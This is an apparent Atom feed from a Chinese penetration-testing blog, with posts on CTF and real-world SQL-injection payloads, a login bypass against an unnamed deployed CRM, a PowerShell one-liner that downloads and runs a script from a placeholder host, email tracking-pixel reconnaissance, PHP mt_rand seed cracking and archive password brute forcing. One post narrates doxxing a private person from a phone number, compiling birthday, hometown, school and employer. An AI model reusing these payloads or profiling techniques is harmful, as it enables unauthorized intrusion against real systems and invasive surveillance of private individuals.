<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[FreeV's Blog]]></title>
  
  <link href="/atom.xml" rel="self"/>
  <link href="http://www.freev.cc/"/>
  <updated>2017-06-27T06:46:11.432Z</updated>
  <id>http://www.freev.cc/</id>
  
  <author>
    <name><![CDATA[FreeV]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[某ctf注入bypass]]></title>
    <link href="http://www.freev.cc/2017/06/27/%E6%9F%90ctf%E6%B3%A8%E5%85%A5bypass/"/>
    <id>http://www.freev.cc/2017/06/27/某ctf注入bypass/</id>
    <published>2017-06-27T06:02:15.000Z</published>
    <updated>2017-06-27T06:46:11.432Z</updated>
    <content type="html"><![CDATA[<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>群里面发出来得我就随便学习一下，源代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line">    <span class="keyword">require</span>(<span class="string">"config.php"</span>);</span><br><span class="line">    <span class="variable">$table</span> = <span class="variable">$_GET</span>[<span class="string">'table'</span>]?<span class="variable">$_GET</span>[<span class="string">'table'</span>]:<span class="string">"test"</span>;</span><br><span class="line">    <span class="variable">$table</span> = Filter(<span class="variable">$table</span>);</span><br><span class="line">    mysqli_query(<span class="variable">$mysqli</span>,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</span><br><span class="line">    <span class="variable">$ret</span> = sql_query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ret</span>[<span class="number">0</span>];</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><p>payload(注意反引号 ‘ ` ‘,建议复制到文本查看):<br><a href="http://39.xx:5003/index.php?table=flag`--" target="_blank" rel="external">http://39.xx:5003/index.php?table=flag`--</a> `where id = 1%23<br><a href="http://39.xx:5003/index.php?table=flag`--" target="_blank" rel="external">http://39.xx:5003/index.php?table=flag`--</a> `where 1 xor sleep(2) %23<br><a href="http://39.xx:5003/index.php?table=flag`--" target="_blank" rel="external">http://39.xx:5003/index.php?table=flag`--</a> `where 1 union select  version() limit 1,1%23<br><a href="http://39.xx:5003/index.php?table=flag`--" target="_blank" rel="external">http://39.xx:5003/index.php?table=flag`--</a> `where 0 union select  COLUMN_NAME from  information_schema.COLUMNS  where table_name=0x7365637265745F666C6167  limit 0,1%23<br>拿到flag</p>
<h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><p>原理总结<br>desc  遇到`– `  (注意两个-)会把第一个`(反引号)当成注释：<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc <span class="escape">`f</span>lag<span class="escape">`-</span>- <span class="escape">`w</span>here id = <span class="number">1</span>#`</span><br></pre></td></tr></table></figure></p>
<p>但是在select语句种遇到`– `不会当注释:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">select</span> <span class="string">'flag&#123;xxx&#125;'</span> <span class="keyword">from</span> flag<span class="string">`-- `</span><span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span>#<span class="string">`</span></span></span><br></pre></td></tr></table></figure></p>
<pre><code>`-- `可以用`/**/ `代替，但是desc `flag`/**/`where id = 1#` 不会返回内容，更多知识大家可以去探索，如果利用这道题会被拦截
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[bypass 绕过desc]]>
    
    </summary>
    
      <category term="sql注入" scheme="http://www.freev.cc/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[另一种信息收集技巧]]></title>
    <link href="http://www.freev.cc/2017/05/01/%E5%8F%A6%E4%B8%80%E7%A7%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%8A%80%E5%B7%A7/"/>
    <id>http://www.freev.cc/2017/05/01/另一种信息收集技巧/</id>
    <published>2017-05-01T12:04:32.000Z</published>
    <updated>2017-05-02T03:04:56.911Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00__u5229_u7528"><a href="#0x00__u5229_u7528" class="headerlink" title="0x00 利用"></a>0x00 利用</h2><p>原理很简单，不多说了吧，大家一看就懂了。通过邮箱系统或者留言管理之类的系统插入一个允许的图片链接，一个你自己的外网服务器的链接就可以，然后等待对方打开你的链接，通过img 标签的src特性会自动请求你的链接，这事你可以通过apache日志查看对方请求的信息，</p>
<p>这里以163邮箱为例，我们给我们想收集的公司发一个邮件：在添加图片按钮处选择网址url，然后填入自己外网服务器一个链接。<br><img src="./1111.png" width="80%" height="200" alt=""><br>这里也可以写一些简单的东西，欺骗一下读者，然后发送给对方，当对象打开邮箱查看时，你就可以查看自己的日志，以你为我用的是apache，这里就以apache为例：<br><img src="./2222.png" width="100%" height="10%" alt=""><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">15.0.0.0 - - [01/May/2017:20:30:24 +0800] "GET /init.php HTTP/1.1" 200 224 "https://mail.qq.com/" </span><br><span class="line">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924</span><br></pre></td></tr></table></figure></p>
<p>通过图片我们看出对方出口ip为：<br>    <em>.</em>.<em>.</em>(第一个字段)<br>    通过qq网页版打开<br>    使用chrome</p>
<p></p>
<h2 id="0x01__u603B_u7ED3"><a href="#0x01__u603B_u7ED3" class="headerlink" title="0x01 总结"></a>0x01 总结</h2><p>这些信息在我们的渗透着还是有很大用处的，这里是以email为例。同样如果公司系统存在留言功能之类系统，同样可以利用，这里不再举例,；可以判断公司真实ip，根据ip锁定地址（<a href="http://www.ipip.net/）以及大面发邮件探索公司网络扩谱。利用浏览器测试xss等。需要大家脑洞了。" target="_blank" rel="external">http://www.ipip.net/）以及大面发邮件探索公司网络扩谱。利用浏览器测试xss等。需要大家脑洞了。</a></p>
<pre><code>Author:FreeV
</code></pre><style>
    table{

    }
    .code pre{
        background: #272727;
        border:2px solid #000;
        color:white;
        font-size: 15px;
    };
    .code pre span{
        font-size: 10px;
    }
    .gutter pre{
        font-size: 18px;
        color:red;
    } 

</style>]]></content>
    <summary type="html">
    <![CDATA[一种收集信息的方法:公司出口ip，内部邮箱系统客户端信息等。]]>
    
    </summary>
    
      <category term="信息收集" scheme="http://www.freev.cc/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[powershell渗透中的应用]]></title>
    <link href="http://www.freev.cc/2017/02/16/powershell%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/"/>
    <id>http://www.freev.cc/2017/02/16/powershell渗透中的应用/</id>
    <published>2017-02-16T12:28:57.000Z</published>
    <updated>2017-02-17T09:16:10.651Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00__u4ECB_u7ECD"><a href="#0x00__u4ECB_u7ECD" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><pre><code>powershell 脚本默认无法在cmd直接运行，处于安全考虑微软程序员设置了PowerShell Execution Policy
</code></pre><p>当你在命令行执行powershell -file 1.ps1 会报错，感兴趣看下面文章<br>参看：<a href="https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.security/Set-ExecutionPolicy" target="_blank" rel="external">https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.security/Set-ExecutionPolicy</a></p>
<h2 id="0x01__u7ED5_u8FC7"><a href="#0x01__u7ED5_u8FC7" class="headerlink" title="0x01 绕过"></a>0x01 绕过</h2><pre><code>最后总结了一种绕过powershell执行策略的方法
</code></pre><p>1,读取然后通过管道符运行<br>    powershell get-content  1.ps1 | powershell -noprofile -<br>2,下载并运行脚本<br>    powershell -nop -c “iex(New-Object Net.WebClient).downloadstring(‘<a href="http://xxx.com//1.ps1" target="_blank" rel="external">http://xxx.com//1.ps1</a>‘)”<br>3,远程下载文件<br>    powershell  -nop -c “ (New-Object System.Net.WebClient).DownloadFile(‘<a href="http://127.0.0.1:8080/1.ps1&#39;,&#39;d://2.sp1" target="_blank" rel="external">http://127.0.0.1:8080/1.ps1&#39;,&#39;d://2.sp1</a>‘);”<br>参考：<a href="http://www.2cto.com/article/201601/487210.html" target="_blank" rel="external">http://www.2cto.com/article/201601/487210.html</a></p>
<h2 id="0x02__u5E38_u7528_u811A_u672C"><a href="#0x02__u5E38_u7528_u811A_u672C" class="headerlink" title="0x02 常用脚本"></a>0x02 常用脚本</h2><pre><code>freebuf 收藏常用渗透脚本
</code></pre><p>参看：<a href="http://www.freebuf.com/sectool/120675.html" target="_blank" rel="external">http://www.freebuf.com/sectool/120675.html</a></p>
<pre><code>Author:FreeV
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[今天遇到一个站裤分离，数据库在内网，通过注入可以拿到数据库服务器的一个shell，但是没法深入，最后想到利用powershll]]>
    
    </summary>
    
      <category term="渗透技巧" scheme="http://www.freev.cc/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[一次审计中遇到的问题]]></title>
    <link href="http://www.freev.cc/2016/12/06/%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <id>http://www.freev.cc/2016/12/06/一次审计中遇到的问题/</id>
    <published>2016-12-06T07:08:36.000Z</published>
    <updated>2017-06-27T06:04:59.224Z</updated>
    <content type="html"><![CDATA[<h1 id="0x01__u67D0crm"><a href="#0x01__u67D0crm" class="headerlink" title="0x01 某crm"></a>0x01 某crm</h1><p>这个漏洞之前提交过，厂商不再关注了。就跟大家分享一下：因为现在很多企业，学校都再用，就不说厂商名字了。<br>代码是混淆过的，不过没关系，把eval 换成echo。运行 也会echo出源码。默认mysql链接字符集是gbk这很关键。直接导致宽字节注入。<br>密码验证函数是crypt。crypt是php自带的函数。自行百度吧。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function logincheck($username,$password)							&#123;</span><br><span class="line">trueglobal $db,$表前缀;</span><br><span class="line">true$SQL		= "SELECT * FROM ".$表前缀."user WHERE USER_ID = '$username'";</span><br><span class="line">true$rs			= $db-&gt;Execute($SQL);</span><br><span class="line">true$rs_a		= $rs-&gt;GetArray();</span><br><span class="line">true$USER_ID	= $rs_a[0]['USER_ID'];</span><br><span class="line">true$PASSWORDTEXT = $rs_a[0]['PASSWORD'];</span><br><span class="line">true//print crypt('', $PASSWORDTEXT) == $PASSWORDTEXT;</span><br><span class="line">true//print_R($password);print_R($PASSWORDTEXT);exit;</span><br><span class="line">trueif($USER_ID!="")												&#123;</span><br><span class="line">truetrueif(crypt($password,$PASSWORDTEXT) == $PASSWORDTEXT)			&#123;</span><br><span class="line">truetruetrue//密码正确</span><br><span class="line">truetruetruereturn $rs_a;</span><br><span class="line">truetruetrueexit;</span><br><span class="line">truetrue&#125;</span><br><span class="line">truetrueelse	&#123;</span><br><span class="line">truetruetrue//密码错误</span><br><span class="line">truetruetrue//print_R($password);print_R($username);exit;</span><br><span class="line">truetruetrueecho "&lt;META HTTP-EQUIV=REFRESH CONTENT='0;URL=notchecked.php'&gt;\n";</span><br><span class="line">truetruetrueexit;</span><br><span class="line">truetrue&#125;</span><br><span class="line">true&#125;</span><br><span class="line">trueelse	&#123;</span><br><span class="line">truetrue//用户名不存在</span><br><span class="line">truetrue//print_R($password);print_R($_POST);exit;</span><br><span class="line">truetrueecho "&lt;META HTTP-EQUIV=REFRESH CONTENT='0;URL=notchecked.php'&gt;\n";</span><br><span class="line">truetrueexit;</span><br><span class="line">true&#125;</span><br><span class="line">trueexit;</span><br></pre></td></tr></table></figure></p>
<p>这里宽字节注入肯定没问题了，盲注，报错注入都是可以得。我试了似免登录还真绕过了，crypt函数验证密码，union select 可能帮助我们控制PASSWORDTEXT，并且password也是我们自己提交了.我们自己构造一个：<br>crypt(‘1’,’11b0WGZJEBWiw’)==’11b0WGZJEBWiw’)<br>提交：<br><code>username=1%df&#39; UNION SELECT 1,(select user_id from user limit 1),3,4,5,&#39;11b0WGZJEBWiw&#39;,7,8,9,10,11,12,13,14,15,16,17#&amp;password=1&amp;登录=登录</code><br>这时候会报错，因为后面的单引号被转移了没办法绕过，于是我一直在想怎么绕过，最后发现了这个方法用unhex，不过当unhex的参数是字母时还需要我们用单引号，那我们就再用一层unhex，说到这大家可能懂了<br><code>Select concat(unhex(313162305747),unhex(concat(unhex(35),unhex(41),unhex(34),unhex(41))),unhex(4542576977))</code><br>就是 11b0WGZJEBWiw<br>最后构造pl<br><code>username=1%df&#39; UNION SELECT 1,(select user_id from user limit 1),3,4,5,concat(unhex(313162305747),unhex(concat(unhex(35),unhex(41),unhex(34),unhex(41))),unhex(4542576977)),7,8,9,10,11,12,13,14,15,16,17#&amp;password=1&amp;登录=登录</code><br>成功绕过。</p>
<h1 id="0x02__u603B_u7ED3"><a href="#0x02__u603B_u7ED3" class="headerlink" title="0x02 总结"></a>0x02 总结</h1><pre><code>其实方法还有跟多，还是要看程序过滤哪些函数比如：char()函数，unhex()函数与concat()结合使用。
</code></pre><p>如：<br><code>select concat(char(90),char(90)) : ZZ
select</code></p>
]]></content>
    <summary type="html">
    <![CDATA[某crm登陆绕过]]>
    
    </summary>
    
      <category term="代码审计" scheme="http://www.freev.cc/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[社工实战]]></title>
    <link href="http://www.freev.cc/2016/12/06/%E7%A4%BE%E5%B7%A5%E5%AE%9E%E6%88%98/"/>
    <id>http://www.freev.cc/2016/12/06/社工实战/</id>
    <published>2016-12-06T05:51:11.000Z</published>
    <updated>2016-12-06T06:54:40.195Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00__u5B9E_u6218"><a href="#0x00__u5B9E_u6218" class="headerlink" title="0x00 实战"></a>0x00 实战</h1><p>帮同学查的一个人，信息就是一个电话号：1863038<em>**</em><br>先看看手机号都注册了那些东西<br><img src="1.png" alt="Alt text"><br>收集注册通信社交软件信息：<br>qq手机号搜出以下信息。然后通过qq网名搜索qq号,信息就出来了如图：<br><img src="./12.png" width="300" height="200" alt=""><img src="./13.png" width="300" height="200" alt=""><br><img src="./14.png" width="300" height="200" alt=""><br>微博：我先在微博搜索的qq网名。微信名等。未发现什么有用信息。后来想到支付宝实名。<br><img src="./15.png" width="300" height="200" alt=""></p>
<p>可以看到实名为*某某，只能看到后两位。<br>然后通过微博查找qq 网名。微信网名，支付宝网名，姓名等等，最后还是通过支付宝名字找到的。<br><img src="./16.png" width="300" height="200" alt=""><br>然后点进去就能看到很多资料了<br><img src="./22.png" width="300" height="200" alt=""></p>
<p>到这里，基本信息也就知道，但是还不够详细，最后想到了他注册的人人网，因为人人网也实名制。<br>进入人人网-&gt;登陆-&gt;主页-&gt;大学同学，如果你的账号已经设置过大学需要你在编辑信息处清除。然后主页就会出现如图<br><img src="./23.png" width="300" height="200" alt=""><br>根据微博的信息，输入，**大学， 入学年份2013，*学院，然后搜索某某，当然也可以这么搜：<br><img src="./334.png" width="300" height="200" alt=""><br>到这里 只需要你轻轻的点进去就行了。<br><img src="./661.png" width="300" height="200" alt=""><br>结合微博。百度等信息：<br>姓名：***  性别： 男<br>生日：1995年2月4日<br>家乡： 河北 秦皇岛<br>电话：1863038****</p>
<p>邮箱: **k.net<br>微信名：刺客<br>qq号：812*****： 名：****黑星！<br>微博名：******<br>工作情况：<br>公司：<br>国家建筑师****团队 (2014 - 2016)<br>地区：广东 ，深圳<br>职位：常务管理员<br>**大学学生    来自河北秦皇岛市<br>团队：*****二次作品综合创作团队<br>教育信息：<br>高中：秦皇岛市第一中学2013届文科实验班（职位：生活委员）<br>高中同学：*馨，*明，与*某某同时进入武汉大学。<br>大学：**大学 (2013年)    **学院<br>微博还能搜到照片 ，就不贴出来了。</p>
<h1 id="0x01__u5B9E_u6218_u603B_u7ED3"><a href="#0x01__u5B9E_u6218_u603B_u7ED3" class="headerlink" title="0x01 实战总结"></a>0x01 实战总结</h1><p>社工的本质就是利用社会心理学，大数据分析，社交网络等信息相结合，其实知道大学和入学年分，如果有必要还可以深入到学校内部，了解更多信息。<br>比如进入班级群，专业群等，下载一些敏感文件，入侵学校教务系统等，因为同学没要求那么明细，就到这里吧。</p>
]]></content>
    <summary type="html">
    <![CDATA[实战记录，还是挺有趣的。]]>
    
    </summary>
    
      <category term="社会工程学" scheme="http://www.freev.cc/tags/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[sql注入梳理（1）]]></title>
    <link href="http://www.freev.cc/2016/10/27/sql%E6%B3%A8%E5%85%A5%E6%A2%B3%E7%90%86%EF%BC%881%EF%BC%89/"/>
    <id>http://www.freev.cc/2016/10/27/sql注入梳理（1）/</id>
    <published>2016-10-27T11:53:48.000Z</published>
    <updated>2016-10-29T15:13:20.202Z</updated>
    <content type="html"><![CDATA[<p>判断数据库;<br>    mysql    and length(2)=1  char_length(1)=1<br>    mssql   and len(1)=1  DATALENGTH<br>    oracle and lengthb(1)=1</p>
<p>报错注入：<br>    有错误回显<br>    select <em> from admin where id=123<br>    select </em> from admin where id=123 and exp(~(select <em>from (select VERSION())a))<br>    select </em> from admin where id=123 and updatexml(1,concat(0x5e,(select user()),0x5e),1)<br>盲注：<br>    time<br>    select * from admin where id =’123’ and (IF((ascii(substr((version()),1,1))=53),sleep(3),sleep(0)))</p>
<pre><code>bool
select * from admin where id =&apos;123&apos; and(ascii(substr(version(),1,1))=53)

select * from admin where id =&apos;123&apos; and ascii(substr((version()),1,1))=53
select * from admin where id =&apos;123&apos; and substr((select flag from flag limit 0,1),1,1)=&apos;f&apos;
</code></pre><p>union注入：<br>    有回显数据 order by 之前<br>    判断 列数<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=123</a>‘ order by  3%23<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=-123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=-123</a>‘ union select 1,2,3%23<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=-123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=-123</a>‘ union select 1,version(),3%23<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=-123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=-123</a>‘ union select 1,group_concat(table_name),3 from  information_schema.tables where table_schema=database()%23<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=-123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=-123</a>‘ union select 1,group_concat(column_name),3 from  information_schema.columns where table_name=0x61646D696E%23<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=-123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=-123</a>‘ union select 1,group_concat(username,0x5e,password),3 from  admin%23</p>
<p>sleep benchmark函数的安全问题<br>判断表 字段<br>快速注入：<br>exists(substr((select flag from flag),1,1)=’f’)</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>判断数据库;<br>    mysql    and length(2)=1  char_length(1)=1<br>    mssql   and len(1)=1  DATALENGTH<br>    oracle and lengthb(1)=1</p>
<p>报错]]>
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[php随机数函数安全]]></title>
    <link href="http://www.freev.cc/2016/09/12/php%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%87%BD%E6%95%B0%E5%AE%89%E5%85%A8/"/>
    <id>http://www.freev.cc/2016/09/12/php随机数函数安全/</id>
    <published>2016-09-12T08:53:34.000Z</published>
    <updated>2016-12-06T05:44:09.487Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_rand_28_29_u51FD_u6570"><a href="#0x00_rand_28_29_u51FD_u6570" class="headerlink" title="0x00 rand()函数"></a>0x00 rand()函数</h1><p>rand()的随机数默认最大32767，可以用于爆破这里不再举例。</p>
<h2 id="0x01_mt_rand_28_29_u548Cmt_srand_28_29_u51FD_u6570"><a href="#0x01_mt_rand_28_29_u548Cmt_srand_28_29_u51FD_u6570" class="headerlink" title="0x01 mt_rand()和mt_srand()函数"></a>0x01 mt_rand()和mt_srand()函数</h2><p>mt_srand()函数用于播种，PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 函数给随机数发生器播种，当PHP版本到了5.2.1后，通过修改算法修补了奇数和偶数的播种相等的问题，这样也导致了php5.2.0前后导致同一个播种后的mt_rand()的值不一样<br>5.2.6&gt;php&gt;4.2.0默认播种的算法也不是很强悍，当目标&gt;5.20时候，我们exp运行的环境也要是&gt;5.20的版本，mt_rand处理的数据都是不安全的。在web应用里很多都使用mt_rand来处理随机的session，比如密码找回功能等等。<br>如果你知道一个mt_rand()的值就可以，就可以推断出mt_srand()的种子值，从而推断出下一个mt_rand()值。<br>工具:<a href="http://download.openwall.net/pub/projects/php_mt_seed/php_mt_seed-3.2.tar.gz" target="_blank" rel="external">http://download.openwall.net/pub/projects/php_mt_seed/php_mt_seed-3.2.tar.gz</a></p>
<p>root@kali:~# php5 -r ‘mt_srand(123123123); echo mt_rand(),”\n”; echo mt_rand(),”\n”;’<br>519979806<br>1474031914</p>
<p>root@kali:~/php_mt_seed-3.2# ./php_mt_seed 519979806<br>Found 0, trying 100663296 - 134217727, speed 34831590 seeds per second<br>seed = 123123123<br>Found 1, trying 1509949440 - 1543503871, speed 34497359 seeds per second<br>seed = 1525862101<br>Found 2, trying 3992977408 - 4026531839, speed 34601190 seeds per second<br>seed = 3994356879<br>Found 3, trying 4261412864 - 4294967295, speed 34578163 seeds per second<br>Found 3</p>
<p>可见程序给出了三个种子，逐个测试即可：<br>root@kali:~# php5 -r ‘mt_srand(1525862101); echo mt_rand(),”\n”; echo mt_rand(),”\n”;’<br>519979806<br>14803299<br>root@kali:~# php5 -r ‘mt_srand(3994356879); echo mt_rand(),”\n”; echo mt_rand(),”\n”;’<br>519979806<br>978260809</p>
<p>123123123为真正的种子，这样就可以轻松拿到真正的种子，下一个要产生的随机数也就知道了</p>
<pre><code>Author:FreeV
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[rand() mt_rand() mt_srand()函数安全问题]]>
    
    </summary>
    
      <category term="代码审计" scheme="http://www.freev.cc/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[sql注入之最短姿势]]></title>
    <link href="http://www.freev.cc/2016/09/10/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9C%80%E7%9F%AD%E5%A7%BF%E5%8A%BF/"/>
    <id>http://www.freev.cc/2016/09/10/sql注入之最短姿势/</id>
    <published>2016-09-10T06:07:34.000Z</published>
    <updated>2016-09-12T08:51:17.134Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00__u59FF_u52BF"><a href="#0x00__u59FF_u52BF" class="headerlink" title="0x00 姿势"></a>0x00 姿势</h2><p>select <em> from user where id=’’=0# and password=’ad’<br>select </em> from user where id=’’ 返回为空 相当于0=0，即绕过了长短问题</p>
<p>exp：<br>select * from user where id=’’&gt;-1# and password=’ad’      相当于0&gt;-1#</p>
<p>利用符号<br>select <em> from users  where id=-0# and password=’ad’<br>select </em> from users where id=1&amp;0# and password=’ad’</p>
<p>当然也可以判断注入<br>select <em> from users    where id=’admin’&gt;0 正常<br>select </em> from users    where id=’xx’&gt;0    报错 </p>
<p>相关链接：<br>    <a href="https://www.exploit-db.com/papers/18263/" target="_blank" rel="external">https://www.exploit-db.com/papers/18263/</a></p>
<pre><code>Author:FreeV
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[关于输入框最短的注入方式]]>
    
    </summary>
    
      <category term="sql注入" scheme="http://www.freev.cc/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[ctf之压缩文件]]></title>
    <link href="http://www.freev.cc/2016/09/08/ctf%E4%B9%8B%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6/"/>
    <id>http://www.freev.cc/2016/09/08/ctf之压缩文件/</id>
    <published>2016-09-08T06:52:32.000Z</published>
    <updated>2016-10-05T07:50:54.707Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_ZIP_u6587_u4EF6_u4F2A_u52A0_u5BC6"><a href="#0x00_ZIP_u6587_u4EF6_u4F2A_u52A0_u5BC6" class="headerlink" title="0x00 ZIP文件伪加密"></a>0x00 ZIP文件伪加密</h2><p>用ue16进制打开zip文件后，50 4B 01 02 3F 00 14 00 0*改成  50 4B 01 02 3F 00 14 00 01即完成加密</p>
<h2 id="0x01_RAR_u6587_u4EF6_u4F2A_u52A0_u5BC6"><a href="#0x01_RAR_u6587_u4EF6_u4F2A_u52A0_u5BC6" class="headerlink" title="0x01 RAR文件伪加密"></a>0x01 RAR文件伪加密</h2><p>用ue16进制打开在要rar的文件后，在0ha位置改成80，即完成伪加密,不同的是你用zip解压工具打开不会报错，如果你用rar解压工具打开会提示文件头格式错误，这个是文件头校验问题。需要自己计算crc这里不再演示</p>
<h2 id="0x03_linux_u4E0B_u66B4_u529B_u7834_u89E3rar_zip_7z"><a href="#0x03_linux_u4E0B_u66B4_u529B_u7834_u89E3rar_zip_7z" class="headerlink" title="0x03 linux下暴力破解rar zip 7z"></a>0x03 linux下暴力破解rar zip 7z</h2><p>下载rarcrack-0.2.tar.bz2<br>安装make &amp;&amp; make install</p>
<p>使用方法简单：<br>rarcrack –threads xx –type rar xx.rar<br>–threads             #线程<br>–type                   #文件格式 rar zip 7z<br>默认从0开始破解，密码元素默认为大小写字母加数字；当然有也可以自定义：<br>在要破解密码的rar文件同一目录下新建一个.xml文件，内容为：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="pi">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">rarcrack</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">abc</span>&gt;</span>0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<span class="tag">&lt;/<span class="title">abc</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">current</span>&gt;</span>xxxxxx<span class="tag">&lt;/<span class="title">current</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">good_password</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">rarcrack</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>我通常简单的爆破命令就是：rarcrack  –type zip baozou_new.zip<br>相关文章：<br><a href="http://www.docin.com/p-56091789.html" target="_blank" rel="external">http://www.docin.com/p-56091789.html</a><br><a href="http://wenku.baidu.com/view/800321eb19e8b8f67c1cb983.html" target="_blank" rel="external">http://wenku.baidu.com/view/800321eb19e8b8f67c1cb983.html</a><br><a href="http://xiao106347.blog.163.com/blog/static/2159920782013113110825196" target="_blank" rel="external">http://xiao106347.blog.163.com/blog/static/2159920782013113110825196</a></p>
<pre><code>Author:FreeV
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_ZIP_u6587_u4EF6_u4F2A_u52A0_u5BC6"><a href="#0x00_ZIP_u6587_u4EF6_u4F2A_u52A0_u5BC6" class="headerlink" title="0x00 ZIP文件伪加密"><]]>
    </summary>
    
      <category term="隐写" scheme="http://www.freev.cc/tags/%E9%9A%90%E5%86%99/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[ctf之隐写工具篇]]></title>
    <link href="http://www.freev.cc/2016/09/08/ctf%E4%B9%8B%E9%9A%90%E5%86%99%E5%B7%A5%E5%85%B7%E7%AF%87/"/>
    <id>http://www.freev.cc/2016/09/08/ctf之隐写工具篇/</id>
    <published>2016-09-08T05:33:35.000Z</published>
    <updated>2016-10-06T03:27:11.841Z</updated>
